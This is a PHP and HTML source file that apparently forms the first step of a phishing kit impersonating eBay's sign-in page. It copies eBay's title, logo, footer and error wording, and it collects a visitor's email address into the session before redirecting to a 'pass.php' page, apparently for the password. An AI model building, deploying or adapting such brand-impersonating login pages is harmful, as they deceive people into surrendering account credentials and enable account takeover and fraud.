<?php
    session_start();
    $email_id= "";
    $empty_err= $email_id_err= "";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["email_id"]))
        {
            $empty_err= "Oops, that's not a match.";
        }
        else
        {
            $_SESSION['email_id']=htmlspecialchars($_POST["email_id"]);
            $email_id= $_SESSION['email_id'];
            if( filter_var($email_id, FILTER_VALIDATE_EMAIL))
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
            else
            {
                $email_id_err="We couldn't find this eBay account.";
            }
        }
    }    
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Sign in or Register | eBay</title>
</head>

<body>
    <img src="logo.png" alt="Ebay_logo">
    <div class="container">
        <div class="top_container">
            <p>To buy and sell on <a href="www.ebay.com">www.ebay.com</a> or other eBay sites internationally, existing
                users can login using their credentials or new users can register an eBay account on ebay.in. Kindly
                note you can no longer buy or sell on eBay.in.</p>
        </div>
        <h1>Hello</h1>
        <p class="signin_text">Sign in to eBay or <a
                href="https://signup.ebay.com/pa/crte?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&signInUrl=https%3A%2F%2Fsignin.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1&_trksid=p2487285.m5021.l46827">create
                an account</a></p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <input type="text" placeholder="Enter the email id" name="email_id" class="u_input">
            <div class="php_error"><?php echo $empty_err , $email_id_err ?></div>
            <input type="submit" value="Continue" class="submit">
            <input type="checkbox" id="cb">
            <label for="cb">Stay signed in</label>
        </form>
    </div>
    <footer>
        <p>Copyright © 1995-2024 eBay Inc. All Rights Reserved. <a href="">Accessibility</a>,<a href="">User
                Agreement</a>, <a href="">Privacy</a>, <a href="">Consumer Health Data</a>, <a href="">Payments Terms of
                Use</a>, <a href="">Cookies</a>, <a href="">CA Privacy Notice</a>, <a href="">Your Privacy Choices</a>
            and <a href="">AdChoice</a></p>
    </footer>
</body>

</html>